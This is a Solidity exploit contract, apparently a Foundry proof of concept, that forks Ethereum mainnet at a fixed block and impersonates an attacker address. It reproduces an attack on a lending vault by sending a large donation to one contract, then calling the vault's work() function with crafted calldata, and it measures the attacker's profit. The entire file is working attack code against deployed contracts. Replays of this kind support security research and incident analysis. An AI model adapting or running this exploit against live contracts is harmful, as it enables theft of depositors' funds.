// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface Bank {
    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function startPrank(address, address) external;
}

contract Exploit {
    function run() external payable returns (uint256) {
        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 12_394_009);

        address attacker = 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233;
        Bank vault = Bank(0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A);
        uint256 initBalance = attacker.balance;

        cheats.startPrank(attacker, attacker);

        (bool success, ) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{value: 1_031_000_000_000_000_000_000}(abi.encodeWithSignature("donate()"));
        require(success, "donate failed");

        bytes memory data = hex"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        vault.work{value: 100_000_000}(0, 0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24, 0, 100_000_000_000_000_000_000_000, data);

        uint256 finalBalance = attacker.balance;
        return finalBalance > initBalance ? finalBalance - initBalance : 0;
    }

    receive() external payable {}
}
